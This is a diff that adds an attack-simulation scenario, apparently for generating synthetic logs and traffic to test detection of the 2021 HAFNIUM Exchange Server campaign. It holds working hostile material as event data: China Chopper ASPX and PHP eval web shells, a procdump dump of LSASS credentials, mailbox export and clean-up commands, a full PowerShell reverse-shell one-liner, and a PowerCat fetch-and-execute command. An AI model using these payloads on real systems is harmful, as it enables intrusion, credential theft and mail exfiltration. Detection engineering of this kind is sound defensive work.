@@ -1,0 +1,144 @@
+ami_version 1
+reference "https://www.microsoft.com/security/blog/2021/03/02/hafnium-targeting-exchange-servers/"
+reference "https://en.wikipedia.org/wiki/China_Chopper"
+reference "https://www.fireeye.com/content/dam/fireeye-www/global/en/current-threats/pdfs/rpt-china-chopper.pdf"
+reference "https://blog.talosintelligence.com/2021/03/hafnium-update.html"
+revision 1
+
+# A Random IP from the dmoains given in the list
+$attacker_ip = "203.99.24.214"
+$ip-dst = $attacker_ip
+$ip-src = "172.16.0.23"
+$aspx_webshell = """<%@ Page Language="Jscript"%><%eval(Request.Item["Security"],"unsafe");%>"""
+$php_webshell = """<?php @eval($_POST['password']);?>"""
+$user-agent = "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.74 Safari/537.36 Edg/79.0.309.43"
+$victim-nat = "192.168.0.23"
+$victim-port = "32232"
+
+$powercat = "https://raw.githubusercontent.com/besimorhino/powercat/master/powercat.ps1"
+
+$file_sharing_domain = "mego.io"
+$file_sharing_ip = "89.44.169.139"
+
+$agent-id = uuid.v4(" ")
+
+# Exchange Servers are controlled by China Chopper programmed in JScript
+# POST requests to the .aspx script executing code with JScript 'eval' function
+action http {
+    $resp-content = $aspx_webshell
+    $client-content = ""
+    $uri = "/healthcheck.aspx"
+
+    $resp-content-type = "application/javascript"
+    $resp-content = $aspx_webshell
+    
+    exec HTTPConnection
+}
+
+sleep 120
+
+action newprocess-procdump {
+    $log_plugin = "mswin-security"
+    field["event_id"] = "4688"
+    field["winlog_event_id"] = "4688"
+
+    field["winlog_event_data_NewProcessName"] = """c:\\windows\\temp\\procdump64 -accepteula -ma lsass.exe c:\\windows\\temp\\lsass"""
+    field["agent_ephemeral_id"] = $agent-id
+    
+    exec Controller
+}
+
+sleep 90
+
+action newprocess-compress-stolen-data {
+    $log_plugin = "mswin-security"
+    field["event_id"] = "4688"
+    field["winlog_event_id"] = "4688"
+
+    field["winlog_event_data_NewProcessName"] = """c:\\ProgramData\\7z a -t7z -r  c:\\ProgramData\\it.zip c:\\ProgramData\\pst"""
+    field["agent_ephemeral_id"] = $agent-id
+    
+    exec Controller
+}
+
+sleep 10
+
+# Powershell Add-PSSnapin
+action Exchange-Snapin {
+    $log_plugin = "mswin-powershell"
+    field["winlog_event_id"] = "4104"
+    field["event_id"] = "4104"
+
+    field["winlog_event_data_ScriptBlockText"] = """Add-PSSnapin Microsoft.Exchange.Management.Powershell.SnapIn;&#x0A;Get-Mailbox&#x0A"""
+    
+    exec Controller    
+}
+
+action Exchange-Snapin2 {
+    $log_plugin = "mswin-powershell"
+    field["winlog_event_id"] = "4104"
+    field["event_id"] = "4104"
+
+    field["winlog_event_data_ScriptBlockText"] = """Add-PSSnapin Microsoft.Exchange.Management.Powershell.SnapIn;Get-MailboxExportRequest -ResultSize 100"""
+    
+    exec Controller    
+}
+
+action Exchange-Snapin3 {
+    $log_plugin = "mswin-powershell"
+    field["winlog_event_id"] = "4104"
+    field["event_id"] = "4104"
+
+    field["winlog_event_data_ScriptBlockText"] = """Add-PSSnapin Microsoft.Exchange.Management.Powershell.SnapIn;Get-MailboxExportRequest|Remove-MailboxExportRequest -Confirm:$false"""
+    
+    exec Controller    
+}
+
+sleep 230
+
+action nishang {
+    $log_plugin = "mswin-security"
+    field["event_id"] = "4688"
+    field["winlog_event_id"] = "4688"
+
+    field["winlog_event_data_NewProcessName"] = s"""powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient(${victim-nat}:${victim-port}); $stream = $client.GetStream(); [byte[]]$bytes= 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0) {;$data= (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes, 0, $i);$sendback = (iex $data 2>&1 | Out-String ); $sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2); $stream.Write($sendbyte, 0, $sendbyte.Length);$stream.Flush()};$client.Close()" """
+    field["agent_ephemeral_id"] = $agent-id
+    
+    exec Controller
+}
+
+sleep 51
+
+action Download-PowerCat {
+    $log_plugin = "mswin-powershell"
+    field["winlog_event_id"] = "4104"
+    field["event_id"] = "4104"
+
+    field["winlog_event_data_ScriptBlockText"] = s"""IEX (New-Object System.Net.Webclient).DownloadString('https://raw.githubusercontent.com/besimorhino/powercat/master/powercat.ps1'); powercat -c ${victim-nat} -p ${victim-port} -e powershell"""
+    
+    exec Controller    
+}
+
+sleep 500
+
+action megaxfer {
+    $filename = "mega.pcap"
+    field["ip"].replace("172.16.0.9" => $ip-src)
+    exec PcapImport
+}
+
+sleep 100
+
+repeat 100 as $index {
+    $data = base64.encode(string.random(128))
+    
+    action http {
+	$method = "POST"
+	$domain = "brian.krebsonsecurity.top"
+	$client-content = $data
+	$uri = "/healthcheck.aspx&z1=Y21k&z2=Y2QgL2QgImM6XGluZXRwdWJcd3d3cm9vdFwiJndob2FtaSZlY2hvIFtTXSZjZCZlY2hvIFtFXQ%3D%3D"
+	
+	exec HTTPConnection
+    }
+}
+
